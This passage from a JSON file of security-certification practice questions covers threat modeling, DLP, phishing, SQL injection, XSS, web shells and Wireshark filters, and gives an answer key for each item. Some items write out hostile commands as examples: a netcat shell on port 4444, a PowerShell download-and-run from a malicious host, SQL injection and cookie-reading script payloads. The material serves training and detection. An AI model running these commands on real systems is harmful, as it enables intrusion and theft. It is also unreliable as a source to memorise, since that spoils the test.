      "explanation": "nc (netcat) -nvlp 4444 -e /bin/bash listens on port 4444 and executes /bin/bash, connecting its input/output to the network connection. This grants an attacker a shell on the system whenever they connect to that port. It's a classic method to establish a reverse or bind shell for remote control, which is a significant security concern.",
      "examTip": "nc -e on a listening port is a strong indicator of a reverse shell."
    },
    {
      "id": 38,
      "question": "What is 'threat modeling'?",
      "options": [
        "Creating a three-dimensional model of a network's physical layout.",
        "A structured process for identifying, analyzing, prioritizing, and mitigating potential threats, vulnerabilities, and attack vectors during the system design phase.",
        "Simulating real-world attacks against a live production system to test its defenses.",
        "Developing new security software and hardware solutions to address emerging threats."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Threat modeling is not physical modeling, real-world simulation (that’s pen testing or red teaming), or product development. It is a proactive, systematic approach to identifying and prioritizing potential threats and vulnerabilities early in the design process, helping teams build more secure systems.",
      "examTip": "Threat modeling is a proactive process to identify and address security risks during system design."
    },
    {
      "id": 39,
      "question": "Which of the following security controls is MOST directly focused on preventing 'data exfiltration'?",
      "options": [
        "Intrusion detection system (IDS)",
        "Data loss prevention (DLP)",
        "Firewall",
        "Antivirus software"
      ],
      "correctAnswerIndex": 1,
      "explanation": "IDS detects intrusions, a firewall controls network access, and antivirus targets malware. DLP (Data Loss Prevention) specifically monitors data in use, in motion, and at rest, preventing sensitive information from leaving the organization without authorization.",
      "examTip": "DLP systems are specifically designed to prevent data exfiltration and leakage."
    },
    {
      "id": 40,
      "question": "A user receives an email that appears to be from a legitimate online retailer, offering a too-good-to-be-true discount. The link leads to a website that closely resembles the real retailer's site, but the URL is slightly different (e.g., www.amaz0n.com instead of www.amazon.com). What type of attack is MOST likely being attempted, and what is the BEST course of action for the user?",
      "options": [
        "A legitimate marketing email from the retailer; the user should click the link and take advantage of the offer.",
        "A phishing attack; the user should not click the link, report the email as phishing, and verify any offers directly through the retailer's official website.",
        "A denial-of-service (DoS) attack; the user should forward the email to their IT department.",
        "A cross-site scripting (XSS) attack; the user should reply to the email and ask for clarification."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This is a classic phishing attempt that uses a slightly altered domain name (typosquatting). It's not DoS or XSS. The user should not click the link. Instead, they should report it as phishing and go to the retailer's real site directly.",
      "examTip": "Be extremely cautious of emails with suspicious links and URLs that closely mimic legitimate websites."
    },
    {
      "id": 41,
      "question": "What is the primary purpose of 'input validation' in secure coding practices?",
      "options": [
        "To encrypt user input before it is stored in a database.",
        "To prevent attackers from injecting malicious code or manipulating application logic by thoroughly checking and sanitizing all user-supplied data.",
        "To automatically log users out of a web application after a period of inactivity.",
        "To enforce strong password policies and complexity requirements for user accounts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Input validation is not primarily about encryption, session timeouts, or password policies. It is about ensuring that all data received from users is checked and sanitized so malicious content (e.g., SQL injection, XSS payloads) can’t slip into back-end logic or displays. This includes verifying data type, length, format, and escaping special characters.",
      "examTip": "Input validation is a critical defense against many web application vulnerabilities, especially injection attacks."
    },
    {
      "id": 42,
      "question": "A security analyst observes the following PowerShell command being executed on a compromised Windows system: Invoke-WebRequest -Uri 'http://malicious.example.com/payload.exe' -OutFile 'C:\\Users\\Public\\temp.exe'; Start-Process 'C:\\Users\\Public\\temp.exe' What is this command doing, and why is it a significant security risk?",
      "options": [
        "It is displaying the contents of a remote website; it is not inherently malicious.",
        "It is downloading and executing a file from a remote server; this is a major security concern.",
        "It is creating a new user account on the system; it is a moderate security concern.",
        "It is encrypting a file using PowerShell's built-in encryption capabilities; it is not inherently malicious."
      ],
      "correctAnswerIndex": 1,
      "explanation": "The command downloads payload.exe from a malicious server and saves it as temp.exe, then executes it. This is a major risk because it allows an attacker to introduce and run arbitrary malware on the system, potentially leading to full compromise or lateral movement.",
      "examTip": "PowerShell commands that download and execute files from remote URLs are extremely dangerous."
    },
    {
      "id": 43,
      "question": "What is the primary purpose of using 'security playbooks' in incident response?",
      "options": [
        "To provide a list of all known software vulnerabilities that affect an organization's systems.",
        "To provide step-by-step instructions and procedures for handling specific types of security incidents, ensuring consistency and efficiency.",
        "To automatically fix all identified vulnerabilities and misconfigurations.",
        "To encrypt sensitive data transmitted across a network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Playbooks are not lists of vulnerabilities, patching tools, or encryption solutions. Security playbooks are documented procedures that guide responders on how to handle specific incidents (e.g., ransomware, phishing, data breach). They ensure a consistent, efficient, and organized response.",
      "examTip": "Security playbooks provide standardized, step-by-step instructions for incident response."
    },
    {
      "id": 44,
      "question": "Which of the following is the MOST effective method for detecting and preventing unknown malware (zero-day exploits) and advanced persistent threats (APTs)?",
      "options": [
        "Relying solely on traditional signature-based antivirus software.",
        "Implementing a combination of behavior-based detection, anomaly detection, machine learning, sandboxing, and threat hunting.",
        "Conducting regular vulnerability scans and penetration testing exercises.",
        "Enforcing strong password policies and multi-factor authentication for all user accounts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Signature-based antivirus alone won't catch zero-days or advanced threats. Regular scans and strong authentication are helpful but not sufficient. The best strategy is a multi-layered approach combining behavior-based detection, anomaly detection, ML, sandboxing, and proactive threat hunting. This approach goes beyond known signatures and can detect novel or sophisticated attacks.",
      "examTip": "Detecting unknown threats requires advanced techniques like behavioral analysis, anomaly detection, and threat hunting."
    },
    {
      "id": 45,
      "question": "A company's web application allows users to input search terms. An attacker enters the following search term: ' OR 1=1 -- What type of attack is MOST likely being attempted, and what is the attacker's goal?",
      "options": [
        "Cross-site scripting (XSS); to inject malicious scripts into the website.",
        "SQL injection; to bypass authentication or retrieve all data from a database table.",
        "Denial-of-service (DoS); to overwhelm the web server with requests.",
        "Directory traversal; to access files outside the webroot directory."
      ],
      "correctAnswerIndex": 1,
      "explanation": "This is classic SQL injection syntax, attempting to create a condition that is always true (1=1) and comment out the rest (--). The attacker's goal is often to bypass authentication or retrieve all rows from a table, depending on the query context.",
      "examTip": "SQL injection attacks often use ' OR 1=1 -- to create a universally true condition and bypass query logic."
    },
    {
      "id": 46,
      "question": "Which of the following Linux commands would be MOST useful for examining the listening network ports on a system and identifying the processes associated with those ports?",
      "options": [
        "ps aux",
        "netstat -tulnp (or ss -tulnp)",
        "top",
        "lsof -i"
      ],
      "correctAnswerIndex": 1,
      "explanation": "ps aux shows processes but not network ports. top shows resource usage. lsof -i lists open files (including network sockets) but is less focused on listening ports. netstat -tulnp (or ss -tulpn) specifically shows TCP/UDP listening ports, process IDs, and program names, which is exactly what's needed to see which processes are listening on which ports.",
      "examTip": "netstat -tulnp (or ss -tulpn) is the preferred command for viewing listening ports and associated processes on Linux."
    },
    {
      "id": 47,
      "question": "What is the primary purpose of using a 'demilitarized zone (DMZ)' in a network architecture?",
      "options": [
        "To store highly confidential internal data and applications in a secure location.",
        "To provide a segmented network zone that hosts publicly accessible services (e.g., web servers, email servers) while isolating them from the internal network.",
        "To create a secure virtual private network (VPN) connection for remote users to access internal resources.",
        "To connect directly to the internet without any firewalls or security measures."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A DMZ is not for storing confidential data, creating VPNs, or bypassing firewalls. A DMZ is used to host servers that must be accessible from the public internet (e.g., web, mail, or FTP servers) while keeping them isolated from the internal network. Firewalls are placed on both sides of the DMZ, controlling traffic flow in and out.",
      "examTip": "A DMZ isolates publicly accessible servers to protect the internal network."
    },
    {
      "id": 48,
      "question": "You are investigating a system that you suspect is infected with malware. You run the ps aux command on the Linux system and see the following output (among many other lines): USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1234 0.0 0.1 24680 1800 ? Ss Oct27 0:00 /usr/sbin/sshd -D nobody 9876 50.2 15.5 876543 654321 ? R Oct28 10:23 ./badminer Which process is MOST suspicious and warrants further investigation, and why?",
      "options": [
        "The sshd process, because it is running as the root user.",
        "The badminer process, because it is consuming high CPU and memory, running as the nobody user, and has an unusual name.",
        "Both processes are equally suspicious and require further investigation.",
        "Neither process is suspicious; this is normal system activity."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A legitimate sshd process running as root is expected. The suspicious process is badminer, using a high amount of CPU and RAM, running as nobody, and having an unusual name. This strongly suggests a cryptominer or other malicious software. High resource usage plus a strange binary name is a red flag.",
      "examTip": "Unusual process names, high resource usage, and unexpected user accounts are red flags for potential malware."
    },
    {
      "id": 49,
      "question": "A web server is configured to allow users to upload files. Which of the following is the MOST comprehensive and effective set of security measures to prevent the upload and execution of malicious code?",
      "options": [
        "Limit the size of uploaded files and scan them with a single antivirus engine.",
        "Validate the file type using only the file extension, store uploaded files in a publicly accessible directory, and rename files to prevent naming conflicts.",
        "Validate the file type using multiple methods (not just the extension), restrict executable file types, store uploaded files outside the webroot, and use a randomly generated filename.",
        "Encrypt uploaded files and store them in a database."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Limiting size or relying solely on file extensions is insufficient. Storing files in a publicly accessible directory is risky. Encryption doesn't prevent execution if misconfigured. The best approach is to validate file type by multiple methods (e.g., checking magic numbers), block executable types, store files outside the webroot, and use random filenames. This provides layered protection against malicious uploads.",
      "examTip": "Preventing file upload vulnerabilities requires strict file type validation, storing files outside the webroot, and restricting executable file types."
    },
    {
      "id": 50,
      "question": "A user reports receiving an email that appears to be from a legitimate social media platform, asking them to reset their password due to 'unusual activity.' The link in the email leads to a website that looks identical to the social media platform's login page, but the URL is slightly different. What type of attack is MOST likely being attempted, and what is the BEST course of action for the user?",
      "options": [
        "A legitimate security notification; the user should click the link and reset their password.",
        "A phishing attack; the user should not click the link, report the email as phishing, and access the social media platform directly through their browser or app.",
        "A denial-of-service (DoS) attack; the user should forward the email to their IT department.",
        "A cross-site scripting (XSS) attack; the user should reply to the email and ask for clarification."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A legitimate notification is unlikely to come with a suspicious URL. This is not DoS or XSS. This is a phishing email attempting to harvest the user's credentials by redirecting them to a fake login page. The user should not click the link, should report it as phishing, and navigate directly to the real site's login page if they are concerned about their account.",
      "examTip": "Be extremely cautious of emails requesting password resets or account verification, especially if the URL is suspicious."
    },
    {
      "id": 51,
      "question": "You are analyzing network traffic using Wireshark and observe a connection between a workstation on your internal network and an external IP address. You suspect this connection might be malicious. Which of the following Wireshark display filters would be MOST useful for isolating and examining only the traffic associated with this specific connection?",
      "options": [
        "ip.addr == internal_ip",
        "ip.addr == internal_ip && ip.addr == external_ip",
        "tcp.port == 80",
        "http"
      ],
      "correctAnswerIndex": 1,
      "explanation": "ip.addr == internal_ip would show all traffic to or from the internal IP, not just the specific connection. tcp.port == 80 would show all traffic on port 80, not just this connection. http would show all HTTP traffic, which might not be relevant. To isolate a specific connection (a two-way conversation between two endpoints), you need to filter by both the internal IP address and the external IP address. The correct filter is ip.addr == internal_ip && ip.addr == external_ip. This will display only packets where either the source or destination IP address matches both the internal and external IPs, effectively showing only the traffic for that specific conversation.",
      "examTip": "Use ip.addr == ip1 && ip.addr == ip2 in Wireshark to filter for traffic between two specific IP addresses."
    },
    {
      "id": 52,
      "question": "Which of the following is the MOST accurate definition of 'vulnerability' in the context of cybersecurity?",
      "options": [
        "Any potential danger that could harm a system or network.",
        "A weakness in a system, application, or process that could be exploited by a threat to cause harm.",
        "An attacker who is actively trying to compromise a system.",
        "The likelihood and impact of a successful cyberattack."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A threat is a potential danger. An attacker is the agent of a threat. Risk is the likelihood and impact. A vulnerability is a weakness or flaw in a system, application, network, or process that could be exploited by a threat actor to cause harm. This could be a software bug, a misconfiguration, a design flaw, or any other weakness that could be leveraged by an attacker.",
      "examTip": "A vulnerability is a weakness that can be exploited by a threat."
    },
    {
      "id": 53,
      "question": "What is the primary purpose of 'data loss prevention (DLP)' systems?",
      "options": [
        "To encrypt all data transmitted across a network.",
        "To prevent sensitive data from leaving the organization's control without authorization.",
        "To automatically back up all data to a remote server.",
        "To detect and remove all malware from a network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "DLP may use encryption, but that is not its main function. It’s not primarily for backups or malware removal. DLP solutions are designed to detect, monitor, and prevent sensitive data (PII, financial data, IP, etc.) from being exfiltrated, whether intentionally or accidentally, thus preventing data leakage.",
      "examTip": "DLP systems prevent unauthorized data leakage and exfiltration."
    },
    {
      "id": 54,
      "question": "Which of the following is the MOST effective technique for mitigating 'brute-force' attacks against user login credentials?",
      "options": [
        "Implementing strong password policies and complexity requirements.",
        "Enforcing account lockouts after a limited number of failed login attempts, combined with strong password policies and multi-factor authentication (MFA).",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular security awareness training for employees."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords alone are not enough. HTTPS only protects data in transit. Awareness training is good, but not a direct technical control. The most effective strategy is a combination of account lockouts after a few failed attempts (to stop endless guessing), strong password policies, and multi-factor authentication (MFA) to thwart attacks even if the password is compromised.",
      "examTip": "Account lockouts, strong passwords, and MFA are crucial for mitigating brute-force attacks."
    },
    {
      "id": 55,
      "question": "What is 'threat hunting'?",
      "options": [
        "The process of automatically responding to security alerts generated by a SIEM system.",
        "The proactive and iterative search for evidence of malicious activity within a network or system, often going beyond automated alerts.",
        "The process of installing and configuring security software on workstations and servers.",
        "The development and implementation of security policies and procedures."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Threat hunting is not simply reacting to alerts or installing software. It is a proactive, hypothesis-driven process where analysts look for hidden threats that may have bypassed automated defenses like SIEM or antivirus. Threat hunters examine logs, network traffic, endpoint data, and other telemetry to find signs of compromise.",
      "examTip": "Threat hunting is a proactive search for hidden or undetected threats, requiring human expertise."
    },
    {
      "id": 56,
      "question": "You are investigating a compromised web server and discover a file named shell.php in a directory that should only contain image files. What is the MOST likely purpose of this file, and what is the appropriate NEXT step?",
      "options": [
        "The file is likely a legitimate PHP script used by the website; no action is needed.",
        "The file is likely a web shell, allowing an attacker to execute commands on the server; isolate the server, investigate the file's contents and creation time, and analyze other logs.",
        "The file is likely a harmless text file; it can be safely deleted.",
        "The file is likely a backup of the website's database; move it to a secure location."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A file named shell.php in an images directory is highly suspicious. It almost certainly indicates a web shell, which is malicious code enabling attackers to execute arbitrary commands on the web server. The next steps include isolating the server to prevent further damage, examining the file and logs to see how it got there, and performing a broader incident response investigation.",
      "examTip": "Unexpected PHP files (especially named shell.php or similar) on a web server are highly likely to be web shells."
    },
    {
      "id": 57,
      "question": "What is the primary purpose of a 'Security Information and Event Management (SIEM)' system?",
      "options": [
        "To automatically patch all known software vulnerabilities on a system.",
        "To collect, aggregate, analyze, correlate, and alert on security-relevant events and log data from various sources across the network.",
        "To conduct penetration testing exercises and identify security weaknesses.",
        "To manage user accounts, passwords, and access permissions."
      ],
      "correctAnswerIndex": 1,
      "explanation": "SIEMs don’t automatically patch vulnerabilities, conduct penetration tests, or manage accounts. A SIEM collects and correlates security events and logs from multiple sources, providing real-time alerting and historical analysis to help detect and investigate security incidents.",
      "examTip": "SIEM systems provide centralized security monitoring, event correlation, and alerting."
    },
    {
      "id": 58,
      "question": "You are analyzing network traffic using Wireshark and notice a large number of TCP packets with only the SYN flag set, originating from many different source IP addresses and targeting a single destination IP address and port. What type of attack is MOST likely occurring?",
      "options": [
        "Man-in-the-Middle (MitM) attack",
        "SYN flood attack",
        "Cross-site scripting (XSS) attack",
        "SQL injection attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "A SYN flood attack involves sending a large number of SYN packets to a target without completing the three-way handshake, consuming server resources and potentially leading to denial-of-service (DoS). This is not a MitM, XSS, or SQL injection scenario.",
      "examTip": "A flood of TCP SYN packets without corresponding SYN-ACK/ACK responses is a strong indicator of a SYN flood attack."
    },
    {
      "id": 59,
      "question": "Which of the following is the MOST effective technique for mitigating 'cross-site request forgery (CSRF)' attacks?",
      "options": [
        "Using strong, unique passwords for all user accounts and enforcing multi-factor authentication (MFA).",
        "Implementing anti-CSRF tokens and validating the Origin and Referer headers of HTTP requests.",
        "Encrypting all network traffic using HTTPS.",
        "Conducting regular security awareness training for developers and users."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords and MFA don’t directly prevent CSRF. HTTPS encrypts traffic but doesn’t stop forged requests. Training is good but not a primary technical solution. The best CSRF prevention is using anti-CSRF tokens and checking Origin/Referer headers to ensure the request is coming from the correct site.",
      "examTip": "Anti-CSRF tokens and Origin/Referer header validation are crucial for preventing CSRF attacks."
    },
    {
      "id": 60,
      "question": "A security analyst is reviewing logs and notices a series of events where a user account, normally used only during business hours, suddenly logs in from an unfamiliar IP address at 3:00 AM and accesses several sensitive files. What is the MOST likely explanation, and what immediate actions should be considered?",
      "options": [
        "The user is working remotely and accessing files needed for their job; no action is needed.",
        "The user account is likely compromised; the account should be disabled, the user's workstation should be isolated, and a full investigation should be initiated.",
        "The system's clock is incorrect; the logs should be disregarded.",
        "The user forgot to log out of their account; the system should be rebooted."
      ],
      "correctAnswerIndex": 1,
      "explanation": "An unusual login time from an unfamiliar IP, combined with access to sensitive files, strongly indicates a compromised account. Correct action: disable the account, isolate the system for forensic analysis, and conduct a full investigation to determine scope and impact.",
      "examTip": "Unusual login times, unfamiliar IP addresses, and access to sensitive files are strong indicators of a compromised account."
    },
    {
      "id": 61,
      "question": "What is 'fuzzing' primarily used for in software security testing?",
      "options": [
        "To encrypt data transmitted between a web server and a client's browser.",
        "To identify vulnerabilities in software by providing invalid, unexpected, or random data as input and monitoring for crashes, errors, or unexpected behavior.",
        "To create strong, unique passwords for user accounts and system services.",
        "To systematically review source code to identify security flaws and coding errors."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Fuzzing is a dynamic testing technique where invalid or random inputs are fed into a program to see if it crashes or exposes vulnerabilities. It is not an encryption method, password creation tool, or code review process.",
      "examTip": "Fuzzing is a powerful technique for finding vulnerabilities by providing unexpected input to a program."
    },
    {
      "id": 62,
      "question": "Which of the following Linux commands is MOST useful for searching for specific strings or patterns within multiple files recursively, including displaying the filename and line number where the match is found?",
      "options": [
        "cat",
        "grep -r -n",
        "find",
        "ls -l"
      ],
      "correctAnswerIndex": 1,
      "explanation": "cat simply displays file contents. find locates files by name or other attributes. ls -l lists files and permissions. grep -r -n (recursive with line numbers) is exactly for searching multiple files in subdirectories and showing matches with filenames and line numbers.",
      "examTip": "grep -r -n is a powerful and efficient way to search for text within files and across directories on Linux."
    },
    {
      "id": 63,
      "question": "A user reports their computer is exhibiting slow performance, frequent pop-up advertisements, and unexpected browser redirects. What type of malware is the MOST likely cause of these symptoms?",
      "options": [
        "Ransomware",
        "Adware or a browser hijacker",
        "Rootkit",
        "Worm"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Ransomware encrypts files. Rootkits hide malware presence. Worms propagate themselves. Pop-up ads, redirects, and sluggish performance are classic symptoms of adware or a browser hijacker that displays unwanted ads and modifies browser settings.",
      "examTip": "Adware and browser hijackers cause pop-ups, redirects, and slow performance."
    },
    {
      "id": 64,
      "question": "You are analyzing network traffic using Wireshark. You want to filter the displayed packets to show only traffic to or from a specific IP address (e.g., 192.168.1.50). Which Wireshark display filter is MOST appropriate?",
      "options": [
        "tcp.port == 80",
        "ip.addr == 192.168.1.50",
        "http",
        "tcp.flags.syn == 1"
      ],
      "correctAnswerIndex": 1,
      "explanation": "tcp.port == 80 shows all traffic on port 80. http shows all HTTP traffic. tcp.flags.syn == 1 shows only SYN packets. ip.addr == 192.168.1.50 filters for all traffic where the source or destination is 192.168.1.50, which is exactly what's needed to isolate all traffic to/from that IP.",
      "examTip": "Use ip.addr == <IP address> in Wireshark to filter for traffic to or from a specific IP address."
    },
    {
      "id": 65,
      "question": "Which of the following is the MOST effective method for preventing 'SQL injection' attacks?",
      "options": [
        "Using strong, unique passwords for all database user accounts.",
        "Using parameterized queries (prepared statements) with strict type checking and input validation.",
        "Encrypting all data stored in the database at rest.",
        "Conducting regular penetration testing exercises."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Strong passwords help, but do not directly stop injection. Encryption at rest does not prevent injection either. Penetration testing identifies issues but is not itself preventive. Parameterized queries (and robust input validation) treat user input as data rather than code, thwarting injection attempts.",
      "examTip": "Parameterized queries, strict type checking, and input validation are essential for preventing SQL injection."
    },
    {
      "id": 66,
      "question": "What is the primary security purpose of 'network segmentation'?",
      "options": [
        "To improve network performance by increasing bandwidth and reducing latency.",
        "To limit the impact of a security breach by isolating different parts of the network and restricting lateral movement.",
        "To encrypt all network traffic between different network segments using IPsec tunnels.",
        "To simplify network administration by consolidating all devices onto a single, flat network."
      ],
      "correctAnswerIndex": 1,
      "explanation": "While segmentation can sometimes improve performance, its main security purpose is to limit lateral movement. Encryption is separate, and segmentation actually complicates administration. By dividing the network into smaller zones, an attacker who compromises one segment is less likely to reach more sensitive areas.",
      "examTip": "Network segmentation contains breaches and limits an attacker's ability to move laterally within the network."
    },
    {
      "id": 67,
      "question": "You are investigating a suspected compromise of a Windows server. Which of the following tools or techniques would be MOST useful for detecting the presence of a kernel-mode rootkit?",
      "options": [
        "Task Manager",
        "A specialized rootkit detection tool that can analyze the system's kernel and memory, or a memory forensics toolkit.",
        "Resource Monitor",
        "Windows Event Viewer"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Task Manager, Resource Monitor, and Event Viewer rely on standard APIs that a rootkit can subvert. A specialized rootkit detection tool or memory forensics toolkit (like Volatility) can inspect the system at a lower level, bypassing potentially hooked APIs, and reveal hidden processes or kernel modules.",
      "examTip": "Detecting kernel-mode rootkits requires specialized tools that can analyze system memory and bypass the compromised OS."
    },
    {
      "id": 68,
      "question": "What is the primary security concern with using 'default passwords' on network devices, applications, or operating systems?",
      "options": [
        "Default passwords slow down the performance of the device or application.",
        "Attackers can easily guess or find default passwords online and gain unauthorized access.",
        "Default passwords are too short and don't meet complexity requirements.",
        "Default passwords are not compatible with modern encryption standards."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Performance, complexity, and encryption compatibility issues are secondary. The real risk is that default credentials are publicly known, so attackers routinely try them to gain administrative access if they aren’t changed.",
      "examTip": "Always change default passwords immediately after installing a new device or application."
    },
    {
      "id": 69,
      "question": "A user reports that their web browser is unexpectedly redirecting them to different websites, even when they type in a known, correct URL. What is the MOST likely cause of this behavior?",
      "options": [
        "The user's internet service provider (ISP) is experiencing technical difficulties.",
        "The user's computer is likely infected with malware (e.g., a browser hijacker) or their DNS settings have been modified.",
        "The user's web browser is outdated and needs to be updated.",
        "The websites the user is trying to access are down."
      ],
      "correctAnswerIndex": 1,
      "explanation": "ISP issues typically cause timeouts or errors, not specific redirects. An outdated browser could be insecure, but forced redirects are often caused by malware or hijacked DNS settings. If attackers modify the HOSTS file or DNS server, they can redirect legitimate URLs to malicious sites.",
      "examTip": "Unexpected browser redirects are often caused by malware or compromised DNS settings."
    },
    {
      "id": 70,
      "question": "Which of the following is the MOST accurate description of 'cross-site request forgery (CSRF)'?",
      "options": [
        "A type of firewall used to protect web applications from attacks.",
        "An attack that forces an authenticated user to execute unwanted actions on a web application without their knowledge or consent.",
        "A method for encrypting data transmitted between a web browser and a server.",
        "A technique for creating strong, unique passwords for online accounts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "CSRF is not a firewall, encryption method, or password technique. CSRF exploits the trust a site has in a user's browser session. The attacker tricks the browser into sending requests (e.g., clicking a hidden form) while the user is logged in, making the site think the user willingly performed those actions.",
      "examTip": "CSRF exploits authenticated sessions to force users to perform unintended actions."
    },
    {
      "id": 71,
      "question": "A security analyst observes a process on a Windows system that has established numerous outbound connections to different IP addresses on port 443 (HTTPS). While HTTPS traffic is generally considered secure, why might this still be a cause for concern, and what further investigation would be warranted?",
      "options": [
        "HTTPS traffic is always secure; there is no cause for concern.",
        "The process could be legitimate, but the connections should be investigated to determine the destination IPs, domains, and the process's reputation; it could be C2 communication, data exfiltration, or a compromised legitimate application.",
        "Port 443 is only used for web browsing; this is likely normal user activity.",
        "The connections are likely caused by a misconfigured firewall; the firewall rules should be reviewed."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Even though HTTPS encrypts data, it doesn't guarantee that the destination is benign. Malware can use HTTPS for command and control (C2) or data exfiltration. The suspicious process might be malicious or compromised. You should check the process name, hash, digital signature, and investigate the destination domains/IPs to confirm legitimacy.",
      "examTip": "Even HTTPS traffic can be malicious; investigate the destination and the process initiating the connections."
    },
    {
      "id": 72,
      "question": "What is the primary purpose of 'data minimization' in the context of data privacy and security?",
      "options": [
        "To encrypt all data collected and stored by an organization, regardless of its sensitivity.",
        "To collect and retain only the minimum necessary personal data required for a specific, legitimate purpose, and to delete it when it's no longer needed.",
        "To back up all data to multiple locations to ensure its availability in case of a disaster.",
        "To delete all data after a certain period, regardless of its importance or relevance."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Data minimization means only collecting what you need for a specified legitimate purpose and removing it when it’s no longer necessary. It is not about encrypting all data, backing up all data, or indiscriminate deletion. This helps reduce breach risks and comply with privacy regulations.",
      "examTip": "Data minimization: Collect and keep only what you need, for as long as you need it, and for a legitimate purpose."
    },
    {
      "id": 73,
      "question": "A web application allows users to input their names, which are then displayed on the user's profile page. An attacker enters the following as their name: <script>alert(document.cookie);</script> If the application is vulnerable and a different user views the attacker's profile, what will happen, and what type of vulnerability is this?",
      "options": [
        "The attacker's name will be displayed as <script>alert(document.cookie);</script>; this is not a vulnerability.",
        "The viewing user's browser will execute the JavaScript code, potentially displaying their cookies in an alert box; this is a stored (persistent) cross-site scripting (XSS) vulnerability.",
        "The web server will return an error message; this is a denial-of-service (DoS) vulnerability.",
        "The attacker's name will be stored in the database, but the script will not be executed; this is a SQL injection vulnerability."
      ],
      "correctAnswerIndex": 1,
      "explanation": "If the web app doesn't sanitize or encode user-supplied data, the attacker's injected script will run in other users' browsers. This is a stored XSS (the code is stored on the server and served to other users). The script in this case shows an alert, but in a real attack, it might steal cookies or take other malicious actions.",
      "examTip": "Stored XSS vulnerabilities allow attackers to inject malicious scripts that are executed by other users who view the affected page."
    },
    {
      "id": 74,
      "question": "You are investigating a compromised Linux server and discover a suspicious file named .secret. What Linux command, and associated options, would you use to view the file's contents, even if it's a very large file, without risking overwhelming your terminal or running out of memory?",
      "options": [
        "cat .secret",
        "less .secret",
        "head .secret",
        "strings .secret"
      ],
      "correctAnswerIndex": 1,
      "explanation": "cat .secret dumps the entire file at once. head only shows the first few lines. strings shows only printable characters, which might not reveal everything. less opens the file in a pager, letting you scroll, search, and avoid loading the entire file into memory at once, ideal for large or unknown files.",
      "examTip": "Use less to view large files on Linux one screenful at a time."
    },
    {
      "id": 75,
      "question": "What is the primary security benefit of using 'parameterized queries' (also known as 'prepared statements') in database interactions within web applications?",
      "options": [
        "Parameterized queries automatically encrypt data before it is stored in the database.",
        "Parameterized queries prevent SQL injection attacks by treating user input as data, not as executable code.",
        "Parameterized queries improve database query performance by caching query results.",
        "Parameterized queries automatically generate strong, unique passwords for database users."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Parameterized queries don’t encrypt data or generate passwords. They do often improve performance, but their main security benefit is preventing SQL injection by separating the SQL logic from the user-supplied data. The driver handles any necessary escaping, eliminating many injection vectors.",
      "examTip": "Parameterized queries are the cornerstone of SQL injection prevention."
    },
    {
      "id": 76,
      "question": "Which of the following is the MOST accurate description of 'business continuity planning (BCP)'?",
      "options": [
        "The process of encrypting all sensitive data stored on a company's servers and workstations.",
        "A comprehensive plan and set of procedures designed to ensure that an organization's essential business functions can continue operating during and after a disruption.",
        "The implementation of strong password policies and multi-factor authentication for all user accounts.",
        "The process of conducting regular penetration testing exercises and vulnerability scans."
      ],
      "correctAnswerIndex": 1,
      "explanation": "BCP is not limited to encryption, password policies, or pen testing. Business continuity planning is about ensuring that mission-critical operations continue (or resume quickly) after a disaster, outage, or security incident. This includes identifying crucial resources and processes, and planning how to maintain or restore them.",
      "examTip": "BCP is about ensuring business survival and minimizing downtime during disruptions."
    },
    {
      "id": 77,
      "question": "A security analyst is reviewing logs and notices a large number of requests to a web server, all with variations of the following URL: /page.php?id=1 /page.php?id=2 /page.php?id=3 ... /page.php?id=1000 /page.php?id=1001 /page.php?id=1002 What type of activity is MOST likely being attempted, even if no specific vulnerability is yet identified?",
      "options": [
        "Cross-site scripting (XSS)",
        "Parameter enumeration or forced browsing.",
        "SQL injection",
        "Denial-of-Service (DoS)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The repeated pattern of incrementing IDs suggests enumeration or forced browsing. The attacker might be probing the application for hidden or unlinked pages, valid item IDs, or potential errors. This differs from XSS payloads or DoS floods. SQL injection typically includes special characters. This is more about enumerating parameters for further exploitation or discovery.",
      "examTip": "Sequential or patterned parameter variations in web requests often indicate enumeration or forced browsing attempts."
    },
    {
      "id": 78,
      "question": "You are analyzing a suspicious email. Which of the following email headers is MOST likely to be reliable for determining the actual originating mail server, and why?",
      "options": [
        "From:",
        "Received:",
        "Subject:",
        "To:"
      ],
      "correctAnswerIndex": 1,
      "explanation": "From:, Subject:, and To: can be forged easily. The Received: headers are added by each mail server that handles the message in transit and are more difficult to spoof consistently. Examining the bottom-most Received: header can reveal the original source, though attackers can still manipulate these headers, it’s just harder.",
      "examTip": "Analyze the Received: headers in reverse order (bottom to top) to trace the path of an email and identify its origin."
    },
    {
      "id": 79,
      "question": "What is the primary purpose of a 'web application firewall (WAF)'?",
      "options": [
        "To encrypt all network traffic between a client and a server, regardless of the application.",
        "To filter, monitor, and block malicious HTTP/HTTPS traffic targeting web applications, protecting against common web exploits.",
        "To provide secure remote access to internal network resources using a virtual private network (VPN).",
        "To manage user accounts, passwords, and access permissions for web applications and other systems."
      ],
      "correctAnswerIndex": 1,
